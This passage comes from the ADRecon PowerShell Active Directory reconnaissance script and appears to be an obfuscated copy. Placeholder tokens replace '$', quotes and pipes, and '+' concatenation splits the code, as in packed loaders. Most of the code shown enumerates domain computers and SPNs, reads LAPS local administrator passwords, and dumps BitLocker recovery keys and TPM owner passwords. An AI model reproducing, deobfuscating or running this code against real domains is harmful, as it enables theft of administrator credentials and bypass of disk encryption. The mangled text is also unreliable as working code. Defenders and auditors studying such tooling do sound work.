                Write-Warning lEzj[Get-ADRComputer] Error while enumerating ComputerSPN ObjectslEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                Return bLHnull
            }
        }
        Else
        {
            Try
            {
                bLHADComputers = @( Get-ADComputer -Filter * -ResultPageSize bLHPageS'+'ize -Properties Description,DistinguishedName,DNSHostName,Enabled,IPv4Address,LastLogonDate,xfJ4msDS-AllowedToDelegateToxfJ4,'+'xfJ4ms-ds-CreatorSidxfJ4,xfJ4msDS-SupportedEncryptionTypesxfJ4,Name,Ope'+'ratingSystem,OperatingSystemHotfix,OperatingSystemServicePack,OperatingSystemVersion,PasswordLastSet,primaryGroupID,SamAccountName,servicePrincipalName,SID,SIDHistory,TrustedForDelegation,TrustedToAuthForDelegation,UserAccountControl,whenChanged,whenCreated )
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRComputer] Error while enumerating Computer ObjectslEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                Return bLHnull
            }
        }
        If (bLHADComputers)
        {
            Write-Verbose lEzj[*] Total Computers: bLH([ADRecon.ADWSClass]::ObjectCount(bLHADComputers))lEzj
            If (bLHADRComputers)
            {
                bLHComputerObj = [ADRecon.ADWSClass]::ComputerParser(bLHADComputers, bLHdate, bLHDormantTimeSpan, bLHPassMaxAge, bLHThreads)
            }
            If (bLHADRComputerSPNs)
            {
                bLHComputerSPNObj = [ADRecon.ADWSClass]::ComputerSPNParser(bLHADComputers, bLHThreads)
            }
            Remove-Variable ADComputers
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        If (!bLHADRComputers)
        {
            bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjDomain
            bLHObjSearcher.PageSize = bLHPageSize
            bLHObjSearcher.Filter = lEzj(&(samAccountType=805306369)(servicePrincipalName=*))lEzj
            bLHObjSearcher.PropertiesToLoad.AddRange((lEzjnamelEzj,lEzjserviceprincipalnamelEzj))
            bLHObjSearcher.SearchScope = lEzjSubtreelEzj
            Try
            {
                bLHADComputers = bLHObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRComputer] Error while enumerating ComputerSPN ObjectslEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                Return bLHnull
            }
            bLHObjSearcher.dispose()
        }
        Else
        {
            bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjDomain
            bLHObjSearcher.PageSize = bLHPageSize
            bLHObjSearcher.Filter = lEzj(samAccountType=805306369)lEzj
            bLHObjSearcher.PropertiesToLoad.AddRange((lEzjdescriptionlEzj,lEzjdistinguishednamelEzj,lEzjdnshostnamelEzj,lEzjlastlogontimestamplEzj,lEzjmsDS-AllowedToDelegateTolEzj,lEzjms-ds-CreatorSidlEzj,lEzjmsDS-SupportedEncryptionTypeslEzj,lEzjnamelEzj,lEzj'+'objectsidlEzj,lEzjoperatingsystemlEzj,lEzjoperatingsystemhotfixlEzj,lEzjoperatingsystemservicepacklEzj,lEzjoperatingsystemversionlEzj,lEzjprimarygroupidlEzj,lEzjpwdlastsetlEzj,lEzjsamaccountnamelEzj,lEzjserviceprincipalnamelEzj,lEzjsidhistorylEzj,lEzjuseraccountcontrollEzj,lEzjwhenchangedlEzj,lEzjwhencreatedlEzj))
            bLHObjSearcher.SearchScope = lEzjSubtreelEzj

            Try
            {
                bLHADComputers = bLHObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRComputer] Error while enumerating Computer ObjectslEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                Return bLHnull
            }
            bLHObjSearcher.dispose()
        }

        If (bLHADComputers)
        {
            Write-Verbose lEzj[*] Total Computers: bLH([ADRecon.LDAPClass]::ObjectCount(bLHADComputers))lEzj
            If (bLHADRComputers)
            {
                bLHComputerObj = [ADRecon.LDAPClass]::ComputerParser(bLHADComputers, bLHdate, bLHDormantTimeSpan, bLHPassMaxAge, bLHThreads)
            }
            If (bLHADRComputerSPNs)
            {
                bLHComputerSPNObj = [ADRecon.LDAPClass]::ComputerSPNParser(bLHADComputers, bLHThreads)
            }
            Remove-Variable ADComputers
        }
    }

    If (bLHComputerObj)
    {
        Export-ADR -ADRObj bLHComputerObj -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjComputerslEzj
        Remove-Variable ComputerObj
    }
    If (bLHComputerSPNObj)
    {
        Export-ADR -ADRObj bLHComputerSPNObj -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjComputerSPNslEzj
        Remove-Variable ComputerSPNObj
    }
}

# based on https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1
Function Get-ADRLAPSCheck
{
<#
.SYNOPSIS
    Returns all LAPS (local administrator) stored passwords in the current (or specified) domain.

.DESCRIPTION
    Returns all LAPS (local administrator) stored passwords in the current (or specified) domain. Other details such as the Password Expiration, whether the password is readable by the current user are also returned.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use duri'+'ng processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomain,

        [Parameter(Mandatory = bLHtrue)]
        [int] bLHPageSize,

        [Parameter(Mandatory = bLHfalse)]
        [int] bLHThreads = 10
    )

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        Try
        {
            bLHADComputers = @( Get-ADObject -LDAPFilter lEzj(samAccountType=805306369)lEzj -Properties CN,DNSHostName,xfJ4ms-Mcs-AdmPwdxfJ4,xfJ4ms-Mcs-AdmPwdExpirationTimexfJ4 -ResultPageSize bLHPageSize )
        }
        Catch [System.ArgumentException]
        {
            Write-Warning lEzj[*] LAPS is not implemented.lEzj
            Return bLHnull
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRLAPSCheck] Error while enumerating LAPS ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }

        If (bLHADComputers)
        {
            Write-Verbose lEzj[*] Total LAPS Objects: bLH([ADRecon.ADWSClass]::ObjectCount(bLHADComputers))lEzj
            bLHLAPSObj = [ADRecon.ADWSClass]::LAPSParser(bLHADComputers, bLHThreads)
            Remove-Variable ADComputers
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjDomain
        bLHObjSearcher.PageSize = bLHPageSize
        bLHObjSearcher.Filter = lEzj(samAccountType=805306369)lEzj
        bLHObjSearcher.PropertiesToLoad.AddRange((lEzjcnlEzj,lE'+'zjdnshostnamelEzj,lEzjms-mcs-admpwdlEzj,lEzjms-mcs-admpwdexpirationtimelEzj))
        bLHObjSearcher.SearchScope = lEzjSubtreelEzj
        Try
        {
            bLHADComputers = bLHObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRLAPSCheck] Error whil'+'e enumerating LAPS ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }
        bLHObjSearcher.dispose()

        If (bLHADComputers)
        {
            bLHLAPSCheck = [ADRecon.LDAPClass]::LAPSCheck(bLHADComputers)
            If (-Not bLHLAPSCheck)
            {
                Write-Warning lEzj[*] LAPS is not implemented.lEzj
                Return bLHnull
            }
            Else
            {
                Write-Verbose lEzj[*] Total LAPS Objects: bLH([ADRecon.LDAPClass]::ObjectCount(bLHADComputers))lEzj
                bLHLAPSObj = [ADRecon.LDAPClass]::LAPSParser(bLHADComputers, bLHThreads)
                Remove-Variable ADComputers
            }
        }
    }

    If (bLHLAPSObj)
    {
        Return bLHLAPSObj
    }
    Else
    {
        Return bLHnull
    }
}

Function Get-ADRBitLocker
{
<#
.SYNOPSIS
    Returns all BitLocker Recovery Keys stored in the current (or specified) domain.

.DESCRIPTION
    Returns all BitLocker Recovery Keys stored in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomain,

        [Parameter(Mandatory = bLHfalse)]
        [string] bLHDomainController,

        [Parameter(Mandatory = bLHfalse)]
        [Management.Automation.PSCredential] bLHCredential = [Management.Automation.PSCredential]::Empty
    )

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        Try
        {
            bLHADBitLockerRecoveryKeys = Get-ADObject -LDAPFilter xfJ4(objectClass=msFVE-RecoveryInformation)xfJ4 -Properties distinguishedName,msFVE-RecoveryPassword,msFVE-RecoveryGuid,msFVE-VolumeGuid,Name,whenCreated
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRBitLocker] Error while enumerating msFVE-RecoveryInformation ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }

        If (bLHADBitLockerRecoveryKeys)
        {
            bLHcnt = bLH([ADRecon.ADWSClass]::ObjectCount(bLHADBitLockerRecoveryKeys))
            If (bLHcn'+'t -ge 1)
            {
                Write-Verbose lEzj[*] Total BitLocker Recovery Keys: bLHcntlEzj
                bLHBitLockerObj = @()
                bLHADBitLockerRecoveryKeys 0Ogv ForEach-Object {
                    # Create the object for each instance.
                    bLHObj = New-Object PSObject
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjDistinguished NamelEzj -Value bLH(((bLH_.distinguishedName -split xfJ4}xfJ4)[1]).substring(1))
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjNamelEzj -Value bLH_.Name
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjwhenCreatedlEzj -Value bLH_.whenCreated
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjRecovery Key IDlEzj -Value bLH([GUID] bLH_.xfJ4msFVE-RecoveryGuidxfJ4)
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjRecovery KeylEzj -Value bLH_.xfJ4msFVE-RecoveryPasswordxfJ4
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjVolume GUIDlEzj -Value bLH([GUID] bLH_.xfJ4msFVE-VolumeGuidxfJ4)
                    Try
                    {
                        bLHTempComp = Get-ADComputer -Identity bLHObj.xfJ4Distinguished NamexfJ4 -Properties msTPM-OwnerInformation,msTPM-TpmInformationForComputer
                    }
                    Catch
                    {
                        Write-Warning lEzj[Get-ADRBitLocker] Error while enumerating bLH(bLHObj.xfJ4Distinguished NamexfJ4) Computer ObjectlEzj
                        Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                    }
                    If (bLHTempComp)
                    {
                        # msTPM-OwnerInformation (Vista/7 or Server 2008/R2)
                        bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjmsTPM-OwnerInformationlEzj -Value bLHTempComp.xfJ4m'+'sTPM-OwnerInformationxfJ4

                        # msTPM-TpmInformationForComputer (Windows 8/10 or Server 2012/R2)
                        bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjmsTPM-TpmInformationForComputerlEzj -Value bLHTempComp.xfJ4msTPM-TpmInformationForComputerxfJ4
                        If (bLHnull -ne bLHTempComp.xfJ4msTPM-TpmInformationForComputer'+'xfJ4)
                        {
                            # Grab the TPM Owner Info from the msTPM-InformationObject
                            bLHTPMObject = Get-ADObject -Identity bLHTempComp.xfJ4msTPM-TpmInformationForComputerxfJ4 -Properties msTPM-OwnerInformation
                            bLHTPMRecoveryInfo = bLHTPMObject.xfJ4msTPM-OwnerInformationxfJ4
                        }
                        Else
                        {
                            bLHTPMRecoveryInfo = bLHnull
                        }
                    }
                    Else
                    {
                        bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjmsTPM-OwnerInformationlEzj'+' -Value bLHnull
                        bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjmsTPM-TpmInformationForComput'+'erlEzj -Value bLHnull
                        bLHTPMRecoveryInfo = bLHnull

                    }
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjTPM Owner PasswordlEzj -Value bLHTPMRecoveryInfo
                    bLHBitLockerObj += bLHObj
                }
            }
            Remove-Variable ADBitLockerRecoveryKeys
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjDomain
        bLHObjSearcher.PageSize = bLHPageSize
        bLHObjSearcher.Filter = lEzj(objectClass=msFVE-RecoveryInformation)lEzj
        bLHObjSearcher.PropertiesToLoad.AddRange((lEzjdistinguishedNamelEzj,lEzjmsfve-recoverypasswordlEzj,lEzjmsfve-recoveryguidlEzj,lEzjmsfve-volumeguidlEzj,lEzjmstpm-ownerinformationlEzj,lEzjmstpm-tpminformationforcomputerlEzj,lEzjnamelEzj,lEzjwhencreatedlEzj))
        bLHObjSearcher.SearchScope = lEzjSubtreelEzj

        Try
        {
            bLHADBitLockerRecoveryKeys = bLHObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRBitLocker] Error while enumerating msFVE-RecoveryInformation ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }
        bLHObjSearcher.dispose()

        If (bLHADBitLockerRecoveryKeys)
        {
            bLHcnt = bLH([ADRecon.LDAPClass]::ObjectCount(bLHADBitLockerRecoveryKeys))
            If (bLHcnt -ge 1)
            {
                Write-Verbose lEzj[*] Total BitLocker Recovery Keys: bLHcntlEzj
                bLHBitLockerObj = @()
                bLHADBitLockerRecoveryKeys 0Ogv ForEach-Object {
                    # Create the object for each instance.
                    bLHObj = New-Object PSObject
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjDistinguished NamelEzj -Value bLH(((bLH_.Properties.distinguishedname -split xfJ4}xfJ4)[1]).substring(1))
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjNamelEzj -Value ([string] (bLH_.Properties.name))
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjwhenCreatedlEz'+'j -Value ([DateTime] bLH(bLH_.Properties.whencreated))
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjRecovery Key IDlEzj -Value bLH([GUID] bLH_.Properties.xfJ4msfve-recoveryguidxfJ4[0])
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjRecovery KeylEzj -Value ([string] (bLH_.Properties.xfJ4msfve-recoverypasswordxfJ4))
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjVolume GUIDlEzj -Value bLH([GUID] bLH_.Properties.xfJ4msfve-volumeguidxfJ4[0])

                    bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjDomain
                    bLHObjSearcher.PageSize = bLHPageSize
                    bLHObjSearcher.Filter = lEzj(&(samAccountType=805306369)(distinguishedName=bLH(bLHObj.xfJ4Distinguished NamexfJ4)))lEzj
                    bLHObjSearcher.PropertiesToLoad.AddRange((lEzjmstpm-ownerinformationlEzj,lEzjmstpm-tpminformationforcomputerlEzj))
                    bLHObjSearcher.SearchScope = lEzjSubtreelEz'+'j

                    Try
                    {
                        bLHTempComp = bLHObjSearcher.FindAll()
                    }
                    Catch
                    {
                        Write-Warning lEzj[Get-ADRBitLocker] Error while enumerating bLH(bLHObj.xfJ4Distinguished NamexfJ4) Computer ObjectlEzj
                        Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                    }
                    bLHObjSearcher.dispose()

                    If (bLHTempComp)
                    {
                        # msTPM-OwnerInformation (Vista/7 or Server 2008/R2)
                        bLHObj 0Ogv Add-'+'Member -MemberType NoteProperty -Name lEzjmsTPM-OwnerInformationlEzj -Value bLH([string] bLHTempComp.Properties.xfJ4mstpm-ownerinformationxfJ4)

                        # msTPM-TpmInformationForComputer (Windows 8/10 or Server 2012/R2)
                        bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjmsTPM-TpmInformationForComputerlEzj -Value bLH([string] bLHTempComp.Properties.xfJ4mstpm-tpminformationforcomputerxfJ4)
                        If (bLHnull -ne bLHTempComp.Properties.xfJ4mstpm-tpminformationforcomputerxfJ4)
                        {
                            # Grab the TPM Owne'+'r Info from the msTPM-InformationObject
                            If (bLHCredential -ne [Management.Automation.PSCredential]::Empty)
                            {
                                bLHobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry lEzjLDAP://bLH(bLHDomainController)/bLH(bLHTempComp.Properties.xfJ4mstpm-tpminformationforcomputerxfJ4)lEzj, bLHCredential.UserName,bLHCredential.GetNetworkCredential().Password
                                bLHobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher bLHobjSearchPath
                                bLHobjSearcherPath.PropertiesToLoad.AddRange((lEzjmstpm-ownerinformationlEzj))
                                Try
                                {
                                    bLHTPMObject = bLHobjSearcherPath.FindAll()
                                }
                                Catch
                                {
                                    Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                                }
                                bLHobjSearcherPath.dispose()

                                If (bLHTPMObject)
                                {
                                    bLHTPMRecoveryInfo = bLH([string] bLHTPMObject.Properties.xfJ4mstpm-ownerinformationxfJ4)
                                }
                                Else
                                {
                                    bLHTPMRecoveryInfo = bLHnull
                                }
                            }
                            Else
                            {
                                Try
                                {
                                    bLHTPMObject = ([ADSI]lEzjLDAP://bLH(bLHTempComp.Properties.xfJ4mstpm-tpminformationforcomputerxfJ4)lEzj)
                                }
                                Catch
                                {
                                    Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                  '+'              }
                           '+'     If (bLHTPMObject)
                                {
                                    bLHTPMRecoveryInfo = bLH([string] bLHTPMObject.Properties.xfJ4mstpm-ownerinformationxfJ4)
                                }
                                Else
                                {
                                    bLHTPMRecoveryInfo = bLHnull
                                }
                            }
                        }
                    }
                    Else
                    {
                        bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjmsTPM-OwnerInformationlEzj -Value bLHnull
                        bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjmsTPM-TpmInformationForComputerlEzj -Value bLHnull
                        bLHTPMRecoveryInfo = bLHnull
                    }
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjTPM Owner PasswordlEzj -Value bLHTPMRecoveryInfo
                    bLHBitLockerObj += bLHObj
                }
            }
            Remove-Variable cnt
            Remove-Variable ADBitLockerRecoveryKeys
        }
    }

    If (bLHBitLockerObj)
    {
        Return bLHBitLockerObj
    }
    Else
    {
        Return bLHnull
    }
}

# Modified ConvertFrom-SID function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Function ConvertFrom-SID
{
<#
.SYNOPSIS
    Converts a security identifier (SID) to a group/user name.

    Author: Will Schroeder (@harmj0y)
    License: BSD 3-Clause

.DESCRIPTION
    Converts a security identifier string (SID) t'+'o a group/user name using IADsNameTranslate interface.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER ObjectSid
    Specifies one or more SIDs to convert.

.PARAMETER DomainFQDN
    Specifies the FQDN of the Domain.

.PARAMETER Credential
    Specifies an alternate credential to use for the translation.

.PARAMETER ResolveSIDs
    [bool]
    Whether to resolve SIDs in the ACLs module. (Default False)

.EXAMPLE

    ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108

    TESTLABcnIharmj0y

.EXAMPLE

    lEzjS-1-5-21-890171859-3433809279-3366196753-1107lEzj, lEzjS-1-5-21-890171859-3433809279-3366196753-1108lEzj, lEzjS-1-5-32-562lEzj 0Ogv ConvertFrom-SID

    TESTLABcnIWINDOWS2bLH
    TESTLABcnIharmj0y
    BUILTINcnIDistributed COM Users

.EXAMPLE

    bLHSecPassword = ConvertTo-SecureString xfJ4Password123!xfJ4 -AsPlainText -Force
    bLHCred = New-Object System.Management.Automation.PSCredential(xfJ4TESTLABcnIdfmxfJ4, bLHSecPassword)
    ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108 -Credential bLHCred

    TESTLABcnIharmj0y

.INPUTS
    [String]
    Accepts one or more SID strings on the pipeline.

.OUTPUTS
    [String]
    The converted DOMAINcnIusername.
#>
    Param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHtrue)]
        [Alias(xfJ4SIDxfJ4)]
        #[ValidatePattern(xfJ4^S-1-.*xfJ4)]
        [String]
        bLHObjectSid,

        [Parameter(Mandatory = bLHfalse)]
        [string] bLHDomainFQDN,

        [Parameter(Mandatory = bLHfalse)]
        [Management.Automation.PSCredential] bLHCredential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = bLHfalse)]
        [bool] bLHResolveSID = bLHfalse
    )

    BEGIN {
        # Name Translator Initialization Types
        # https://msdn.microsoft.com/en-us/libr'+'ary/aa772266%28v=vs.85%29.aspx
        bLHADS_NAME_INITTYPE_DOMAIN   = 1 # Initializes a NameTranslate object by setting the domain that the object binds to.
        #bLHADS_NAME_INITTYPE_SERVER   = 2 # Initializes a NameTranslate object by setting the server that the object binds to.
        bLHADS_NAME_INITTYPE_GC       = 3 # Initializes a NameTranslate object by locating the global catalog that the object binds to.

        # Name Transator Name Types
        # https://msdn.microsoft.com/en-us/library/aa772267%28v=vs.85%29.aspx
        #bLHADS_NAME_TYPE_1779                     = 1 # Name format as specified in RFC 1779. For example, lEzjCN=Jeff Smith,CN=users,DC=Fabrikam,DC=comlEzj.
        #bLHADS_NAME_TYPE_CANONICAL                = 2 # Canonical name format. For example, lEzjFabrikam.com/Users/Jeff SmithlEzj.
        bLHADS_NAME_TYPE_NT4                      = 3 # Account name format used in Windows. For example, lEzjFabrikamcnIJeffSmithlEzj.
        #bLHADS_NAME_TYPE_DISPLAY                  = 4 # Display name format. For example, lEzjJeff SmithlEzj.
        #bLHADS_NAME_TYPE_DOMAIN_SIMPLE            = 5 # Simple domain name format. For example, lEzjJeffSmith@Fabrikam.comlEzj.
        #bLHADS_NAME_TYPE_ENTERPRISE_SIMPLE        = 6 # Simple enterprise name format. For example, lEzjJeffSmith@Fabrikam.comlEzj.
        #bLHADS_NAME_TYPE_GUID                     = 7 # Global Unique Identifier format. For example, lEzj{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}lEzj.
        bLHADS_NAME_TYPE_UNKNOWN                  = 8 # Unknown name type. The system will estimate the format. This element is a meaningful option only with the IADsNameTranslate.Set or the IADsNameTranslate.SetEx method, but not with the IADsNameTranslate.Get or IADsNameTranslate.GetEx method.
        #bLHADS_NAME_TYPE_USER_PRINCIPAL_NAME      = 9 # User principal name format. For example, lEzjJeffSmith@Fabrikam.comlEzj.
        #bLHADS_NAME_TYPE_CANONICAL_EX             = 10 # Extended canonical name format. For example, lEzjFabrikam.com/Users Jeff SmithlEzj.
        #bLHADS_NAME_TYPE_SERVICE_PRINCIPAL_NAME   = 11 # Service principal name format. For example, lEzjwww/www.fabrikam.com@fabrikam.comlEzj.
        #bLHADS_NAME_TYPE_SID_OR_SID_HISTORY_NAME  = 12 # A SID string, as defined in the Security Descriptor Definition Language (SDDL), for either the SID of the current object or one from the object SID history. For example, lEzjO:AOG:DAD:(A;;RPWPCCDCLCSWRCWDWOGA;;;S-1-0-0)lEzj

        # https://msdn.microsoft.com/en-us/library/aa772250.aspx
        #bLHADS_CHASE_REFERRALS_NEVER       = (0x00) # The client should never chase the referred-to server. Setting this option prevents a client from contacting other servers in a referral process.
        #bLHADS_CHASE_REFERRALS_SUBORDINATE = (0x20) # The client chases only subordinate referrals which are a subordinate naming context in a directory tree. For example, if the base search is requested for lEzjDC=Fabrikam,DC=ComlEzj, and the server returns a result set and a referral of lEzjDC=Sales,DC=Fabrikam,DC=ComlEzj on the AdbSales server, the client can contact the AdbSales server to continue the search. The ADSI LDAP provider always turns off this flag for paged searches.
        #bLHADS_CHASE_REFERRALS_EXTERNAL    = (0x40) # The client chases external referrals. For example, a client requests server A to perform a search for lEzjDC=Fabrikam,DC=ComlEzj. However, server A does not contain the object, but knows that an independent server, B, owns it. It then refers the client to server B.
        bLHADS_CHASE_REFERRALS_ALWAYS      = (0x60) # Referrals are chased for either the subordinate or external type.
    }

    PROCESS {
        bLHTargetSid = bLH(bLHObjectSid.TrimStart(lEzjO:lEzj))
        bLHTargetSid = bLH(bLHTargetSid.Trim(xfJ4*xfJ4))
        If (bLHTargetSid -match xfJ4^S-1-.*xfJ4)
        {
            Try
            {
                # try to resolve any built-in SIDs first - https://support.microsoft.com/en-us/kb/243330
                Switch (bLHTargetSid) {
                    xfJ4S-1-0xfJ4         { xfJ4Null AuthorityxfJ4 }
                    xfJ4S-1-0-0xfJ4       { xfJ4NobodyxfJ4 }
                    xfJ4S-1-1xfJ4         { xfJ4World AuthorityxfJ4 }
                    xfJ4S-1-1-0xfJ4       { xfJ4EveryonexfJ4 }
                    xfJ4S-1-2xfJ4         { xfJ4Local AuthorityxfJ4 }
                    xfJ4S-1-2-0xfJ4       { xfJ4LocalxfJ4 }
                    xfJ4S-1-2-1xfJ4       { xfJ4Console Logon xfJ4 }
                    xfJ4S-1-3xfJ4         { xfJ4Creator AuthorityxfJ4 }
                    xfJ4S-1-3-0xfJ4       { xfJ4Creator OwnerxfJ4 }
                    xfJ4S-1-3-1xfJ4       { xfJ4Creator GroupxfJ4 }
                    xfJ4S-1-3-2xfJ4       { xfJ4Creator Owner ServerxfJ4 }
                    xfJ4S-1-3-3xfJ4       { xfJ4Creator Group ServerxfJ4 }
           '+'         xfJ4S-1-3-4xfJ4       { xfJ4Owner RightsxfJ4 }
                    xfJ4S-1-4xfJ4         { xfJ4Non-unique AuthorityxfJ4 }
                    xfJ4S-1-5xfJ4         { xfJ4NT AuthorityxfJ4 }
                    xfJ4S-1-5-1xfJ4       { xfJ4DialupxfJ4 }
                    xfJ4S-1-5-2xfJ4       { xfJ4NetworkxfJ4 }
                    xfJ4S-1-5-3xfJ4       { xfJ4BatchxfJ4 }
                    xfJ4S-1-5-4xfJ4       { xfJ4InteractivexfJ4 }
                    xfJ4S-1-5-6xfJ4       { xfJ4ServicexfJ4 }
                    xfJ4S-1-5-7xfJ4       { xfJ4AnonymousxfJ4 }
                    xfJ4S-1-5-8xfJ4       { xfJ4ProxyxfJ4 }
                    xfJ4S-1-5-9xfJ4       { xfJ4Enterprise Domain ControllersxfJ4 }
                    xfJ4S-1-5-10xfJ4      { xfJ4Principal SelfxfJ4 }
                    xfJ4S-1-5-11xfJ4      { xfJ4Authenticated UsersxfJ4 }
                    xfJ4S-1-5-12xfJ4      { xfJ4Restricted CodexfJ4 }
                    xfJ4S-1-5-13xfJ4      { xfJ4Terminal Server UsersxfJ4 }
                    xfJ4S-1-5-14xfJ4      { xfJ4Remote Interactive LogonxfJ4 }
                    xfJ4S-1-5-15xfJ4      { xfJ4This Organization xfJ4 }
                    xfJ4S-1-5-17xfJ4      { xfJ4This Organization xfJ4 }
                    xfJ4S-1-5-18xfJ4      { xfJ4Local SystemxfJ4 }
                    xfJ4S-1-5-19xfJ4      { xfJ4NT AuthorityxfJ4 }
                    xfJ4S-1-5-20xfJ4      { xfJ4NT AuthorityxfJ4 }
                    xfJ4S-1-5-80-0xfJ4    { xfJ4All Services xfJ4 }
                    xfJ4S-1-5-32-544xfJ4  { xfJ4BUILTINcnIAdministratorsxfJ4 }
                    xfJ4S-1-5-32-545xfJ4  { xfJ4BUILTINcnIUsersxfJ4 }
                    xfJ4S-1-5-32-546xfJ4  { xfJ4BUILTINcnIGuestsxfJ4 }
                    xfJ4S-1-5-32-547xfJ4  { xfJ4BUILTINcnIPower UsersxfJ4 }
                    xfJ4S-1-5-32-548xfJ4  { xfJ4BUILTINcnIAccount OperatorsxfJ4 }
                    xfJ4S-1-5-32-549xfJ4  { xfJ4BUILTINcnIServer OperatorsxfJ4 }
                    xfJ4S-1-5-32-550xfJ4  { xfJ4BUILTINcnIPrint OperatorsxfJ4 }
                    xfJ4S-1-5-32-551xfJ4  { xfJ4BUILTINcnIBackup OperatorsxfJ4 }
                    xfJ4S-1-5-32-552xfJ4  { xfJ4BUILTINcnIReplicatorsxfJ4 }
                    xfJ4S-1-5-32-554xfJ4  { xfJ4BUILTINcnIPre-Windows 2000 Compatible AccessxfJ4 }
                    xfJ4S-1-5-32-555xfJ4  { xfJ4BUILTINcnIRemote Desktop UsersxfJ4 }
                    xfJ4S-1-5-32-556xfJ4  { xfJ4BUILTINcnINetwork Configuration OperatorsxfJ4 }
                    xfJ4S-1-5-3'+'2-557xfJ4  { xfJ4BUILTINcnIIncoming Forest Trust BuildersxfJ4 }
                    xfJ4S-1-5-32-558'+'xfJ4  { xfJ4BUILTINcnIPerformance Monitor UsersxfJ4 }
                    xfJ4S-1-5-32-559xfJ4  { xfJ4BUILTINcnIPerformance Log UsersxfJ4 }
